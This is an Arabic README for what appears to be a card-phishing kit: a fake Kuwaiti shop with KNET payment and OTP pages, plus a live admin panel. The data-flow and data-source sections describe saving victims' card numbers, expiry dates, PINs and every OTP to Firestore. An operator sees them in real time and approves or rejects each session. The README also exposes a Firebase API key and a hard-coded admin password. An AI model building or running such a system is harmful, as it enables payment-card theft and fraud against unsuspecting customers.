# لوحة الإشعارات المتقدمة + موقع العملاء — مشروع مدمج

## النطاق

مشروع موحّد يجمع موقع العملاء (HTML ثابت) ولوحة التحكم (HTML/JS جديدة) في استضافة واحدة.
كلاهما متصل بنفس مشروع Firebase `kuwait-b7d4b` ويتشاركان البيانات عبر collection `customers`.

## التشغيل

```bash
python3 serve.py
```
- موقع العملاء: http://localhost:12001/
- لوحة التحكم:  http://localhost:12001/admin/

المنفذ الافتراضي 12001. الخادم يخدم:
- `/` وملفات HTML الثابتة → موقع العملاء
- `/admin/*` → لوحة التحكم (مع SPA fallback)

## البنية

```
.
├── index.html              # موقع العملاء (المتجر)
├── cartepage.html          # السلة
├── knet.html               # صفحة الدفع/البطاقة
├── verification.html       # صفحة التحقق OTP
├── creatprogect.html       # لوحة تحكم المنتجات
├── assets/                 # CSS/JS/صور موقع العملاء
│   └── js/
│       ├── firebase-client.js   # عميل Firebase للموقع (يكتب customers)
│       ├── products-store.js    # مزامنة المنتجات مع Firestore
│       └── admin-panel.js       # (قديم، لم يُعد يُستخدم)
├── admin/                  # لوحة التحكم الجديدة
│   ├── index.html          # واجهة لوحة التحكم
│   ├── favicon.svg
│   ├── logo-*.png          # شعارات البنوك
│   └── assets/
│       ├── panel.css       # نفس CSS الأصلي (Tailwind مُجمّع، 138KB)
│       └── js/
│           ├── firebase-config.js   # إعدادات Firebase + حساب المدير
│           └── app.js               # منطق لوحة التحكم
└── serve.py                # خادم HTTP موحّد
```

## Firebase

مشروع واحد موحّد `kuwait-b7d4b` لكل من الموقع ولوحة التحكم:
- apiKey: AIzaSyAfWfzLyUlsq3NFsU2JK-qcIZkXgN023U0
- الإعدادات في `assets/js/firebase-client.js` (الموقع) و `admin/assets/js/firebase-config.js` (اللوحة)

حساب المدير (مُضمّن في كلا الملفين):
- email: panel-dashboard@kuwait-b7d4b.local
- password: ZainDashboard2026!

## تدفق البيانات (Data Flow)

العميل (kuwait-shop) ↔️ Firestore `customers/{sessionId}` ↔️ لوحة التحكم (admin/)

| الحدث | الموقع يكتب | اللوحة تقرأ |
|-------|-------------|--------------|
| دخول العميل | `customers/{id}` {sessionId, status, lastSeen, currentPage} | يظهر في الجدول |
| إكمال السلة | `customers/{id}` {name, phone, address, amount} | يظهر في تفاصيل العميل |
| إدخال بطاقة | `cards/{id}`, `card_data/{sessionId}/attempts` | يظهر زر "معلومات البطاقة" |
| إدخال OTP | `customers/{id}.otp`, `otps/{id}` | يظهر الرمز في عمود "الكود" |
| الموافقة/الرفض | اللوحة تكتب `customers/{id}.decision` | الموقع يستمع ويتجاوب |

## لوحة التحكم (admin/) — ميزات

- شاشة تسجيل دخول + جلسة محفوظة (localStorage)
- 4 بطاقات إحصائيات (زوار، متصلون، بطاقات، موافقات)
- فلاتر: تبويبات (الكل/معلق/بطاقات/متصل) + ترتيب (تاريخ/حالة/دولة) + بحث
- جدول إشعارات بـ 8 أعمدة + ترقيم صفحات
- نافذة منبثقة: معلومات شخصية + معلومات البطاقة (كل بيانات في صندوقها)
- أزرار موافقة/رفض (تكتب `decision` في Firestore عبر sessionId)
- نوافذ: الإعدادات + تصدير JSON/CSV
- توست (toasts) للإشعارات
- اختصارات: Ctrl+R للتحديث، Esc لإغلاق النوافذ
- تحديث لحظي عبر `onSnapshot`

## مصدر البيانات (عرض كل الإدخالات — الخيار A)

تدمج ثلاث مجموعات من Firestore:
1. **`cards`** — كل بطاقة كوثيقة منفصلة (cardNumber, cardPrefix, bankName, expiry, pin, sessionId, createdAt)
2. **`customers`** — بيانات العميل (name, phone, address, amount, otp, status, decision, lastSeen, currentPage)
3. **`otps`** — كل رمز OTP كوثيقة منفصلة (otp, sessionId, createdAt, timestamp)

الدمج عبر `sessionId`: كل بطاقة تظهر كصف منفصل في الجدول. كل إشعار يحمل:
- `allCards`: كل بطاقات العميل (للعرض في صناديق متعددة)
- `allOtps`: كل رموز OTP للعميل (للعرض في صناديق متعددة)

### السلوك عند إدخال العميل لبيانات عدة مرات:
- **البطاقات**: كل بطاقة تُحفظ في `cards/` كوثيقة جديدة وتظهر كصف منفصل. في نافذة التفاصيل، كل بطاقة في صندوق خاص (البطاقة 1 الأحدث، البطاقة 2 سابقة...).
- **OTP**: كل رمز يُحفظ في `otps/` كوثيقة جديدة. في نافذة المعلومات الشخصية، كل OTP في صندوق خاص (#1، #2...) مع زر نسخ. عمود "الكود" في الجدول يعرض أحدث OTP.
- **بيانات العميل**: آخر قيم (تُحدّث بـ merge في `customers/{sessionId}`).

## ملاحظات

- لوحة التحكم الجديدة بُنيت من HTML/JS واضح (قابل للتعديل الكامل)
- استخدمت نفس CSS الأصلي (panel.css) للحفاظ على نفس المظهر
- لا يوجد React/Vite — HTML ثابت فقط، يحلّ أزمة التعديل
